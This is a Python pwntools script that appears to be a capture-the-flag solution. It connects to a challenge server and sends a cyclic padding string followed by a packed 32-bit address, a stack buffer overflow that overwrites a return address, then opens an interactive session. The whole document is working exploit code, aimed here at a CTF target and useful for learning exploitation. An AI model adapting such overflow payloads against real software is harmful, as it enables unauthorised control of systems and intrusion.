#! /usr/bin/python3

from pwn import *

HOST = 'pwn.challs.ctf.shellmates.club'
PORT = '1403'

p = remote(HOST, PORT)

p.sendline(b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaab\xd6\x91\x04\x08')

p.interactive()
